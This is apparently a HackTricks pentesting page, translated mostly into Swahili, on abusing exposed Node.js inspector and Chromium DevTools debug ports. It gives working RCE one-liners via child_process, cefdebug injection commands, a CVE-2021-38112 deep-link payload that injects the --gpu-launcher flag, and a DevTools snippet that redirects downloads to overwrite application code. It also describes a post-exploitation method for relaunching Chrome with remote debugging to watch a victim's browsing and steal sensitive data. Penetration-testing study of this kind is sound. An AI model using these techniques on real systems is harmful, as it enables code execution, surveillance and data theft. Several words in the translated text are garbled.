# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

## Maelezo ya Msingi

[Kutoka kwenye docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Inapoanzishwa kwa switch ya `--inspect`, process ya Node.js husikiliza client ya debugging. Kwa **default**, itasikiliza kwenye host na port **`127.0.0.1:9229`**. Kila process pia hupewa **UUID** **ya kipekee**.<sup>[[4]](#references)</sup>

Inspector clients lazima zijue na zibainishe host address, port, na UUID ili kuunganishwa. URL kamili itaonekana hivi: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Kwa kuwa **debugger ina ufikiaji kamili wa mazingira ya utekelezaji ya Node.js**, actor hasidi anayeweza kuunganishwa kwenye port hii anaweza kutekeleza arbitrary code kwa niaba ya process ya Node.js (**potential privilege escalation**).

Kuna njia kadhaa za kuanzisha inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Unapoanzisha mchakato unaokaguliwa, kitu kama hiki kitaonekana:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Processes based on **CEF** (**Chromium Embedded Framework**) kama hizi zinahitaji kutumia param: `--remote-debugging-port=9222` ili kufungua **debugger** (ulinzi wa SSRF hubaki karibu sawa). Hata hivyo, badala ya kutoa session ya **NodeJS** **debug**, zitaongea na browser kwa kutumia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), hii ni interface ya ku-control browser, lakini hakuna RCE ya moja kwa moja.<sup>[[5]](#references)</sup>

Unapoanzisha browser iliyo kwenye debug, kitu kama hiki kitaonekana:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Vivinjari, WebSockets na same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Tovuti zinazofunguka katika web-browser zinaweza kutuma WebSocket na HTTP requests chini ya browser security model. **Initial HTTP connection** ni muhimu ili **kupata unique debugger session id**. **Same-origin-policy** **huzuia** tovuti kuweza kutengeneza **connection hii ya HTTP**. Kwa usalama wa ziada dhidi ya [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js huthibitisha kwamba **'Host' headers** za connection zinaainisha **IP address** au **`localhost`** au **`localhost6`** kwa usahihi.<sup>[[12]](#references)</sup>

> [!TIP]
> **Hatua hizi za usalama huzuia kutumia inspector** ku-run code kwa **kutuma tu HTTP request** (jambo ambalo lingewezekana kwa kutumia SSRF vuln).

### Kuanzisha inspector katika processes zinazoendelea

Unaweza kutuma **signal SIGUSR1** kwa nodejs process inayoendelea ili kuifanya **ianzishe inspector** katika default port. Hata hivyo, zingatia kwamba unahitaji kuwa na privileges za kutosha, hivyo hii inaweza kukupa **privileged access to information ndani ya process** lakini si privilege escalation ya moja kwa moja.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Hii ni muhimu katika containers kwa sababu **kusimamisha process na kuanzisha mpya** yenye `--inspect` **si chaguo** kwa sababu **container** ita**uawa** pamoja na process.

### Unganisha kwenye inspector/debugger

Ili kuunganisha kwenye **browser inayotumia Chromium**, URL za `chrome://inspect` au `edge://inspect` zinaweza kufikiwa kwa Chrome au Edge, mtawalia. Kwa kubofya kitufe cha Configure, inapaswa kuhakikisha kuwa **target host na port** zimeorodheshwa kwa usahihi. Picha inaonyesha mfano wa Remote Code Execution (RCE):

![Baada ya URL ya kufikia debugger kuonekana. mf. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Unganisha kwenye inspector/debugger: Ili kuunganisha kwenye browser inayotumia Chromium,...](<../../images/image (674).png>)

Kwa kutumia **command line** unaweza kuunganisha kwenye debugger/inspector ukitumia:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Zana ya [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), inaruhusu **kutafuta inspectors** wanaoendesha locally na **kuingiza code** ndani yao.<sup>[[1]](#references)[[2]](#references)[[11]](#references)[[13]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Kumbuka kwamba **NodeJS RCE exploits hazitafanya kazi** ikiwa umeunganishwa kwenye browser kupitia [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (unahitaji kukagua API ili kupata mambo ya kuvutia ya kufanya nayo).

## RCE katika NodeJS Debugger/Inspector

> [!TIP]
> Ikiwa umefika hapa ukitafuta jinsi ya kupata [**RCE kutoka kwa XSS katika Electron, tafadhali angalia ukurasa huu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Baadhi ya njia za kawaida za kupata **RCE** unapoweza **kuunganisha** kwenye **inspector** ya Node ni kutumia kitu kama hiki (inaonekana kwamba hii **haitafanya kazi katika muunganisho wa Chrome DevTools protocol**):<sup>[[3]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Unaweza kuangalia API hapa: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)<sup>[[5]](#references)</sup>\
Katika sehemu hii nitaorodhesha tu mambo ya kuvutia ambayo nimegundua watu wameyatumia ku-exploit protocol hii.

### Parameter Injection via Deep Links

Katika [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security iligundua kwamba application iliyotegemea CEF **ilisajili UR maalum**I katika mfumo (workspaces://index.html), ambayo ilipokea URI kamili na kisha **ikazindua applicatio inayotegemea CEF**n ikiwa na configuration iliyoundwa kwa sehemu kutoka kwenye URI hiyo.<sup>[[8]](#references)</sup>

Iligunduliwa kwamba parameter za URI zilifanyiwa URL decoding na kutumiwa kuzindua application ya msingi ya CEF, hivyo kumruhusu mtumiaji **ku-inject** flag **`--gpu-launcher`** kwenye **command line** na kutekeleza vitu vya kiholela.

Kwa hiyo, payload kama hii:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Itatekeleza calc.exe.

### Kubatilisha Faili

Badilisha folda ambamo **faili zilizopakuliwa zitahifadhiwa** na pakua faili ili **kubatilisha** mara kwa mara **source code** inayotumiwa ya application kwa **code yako hasidi**.<sup>[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE na exfiltration

Kulingana na post hii: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) inawezekana kupata RCE na kufanya exfiltration ya internal pages kutoka theriver.<sup>[[9]](#references)[[10]](#references)</sup>

### Post-Exploitation

Katika mazingira halisi na **baada ya ku-compromise** user PC inayotumia browser inayotegemea Chrome/Chromium, unaweza kuanzisha Chrome process ikiwa na **debugging imewezeshwa na kufanya port-forward ya debugging port** ili uweze kuifikia. Kwa njia hii utaweza **kukagua kila kitu victim anachofanya kwa Chrome na kuiba taarifa nyeti**.<sup>[[7]](#references)</sup>

Njia ya stealth ni **kusitisha kila Chrome process** na kisha kuita kitu kama
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Marejeleo

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger inspection and exploitation tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Visual Studio Code Remote Code Execution via Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - Getting Started](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Abusing Chrome's Debugging Feature to Observe and Control Browsing Sessions Remotely](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - WebDriver RCE via DNS Rebinding and CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - From Bot to RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)

{{#include ../../banners/hacktricks-training.md}}
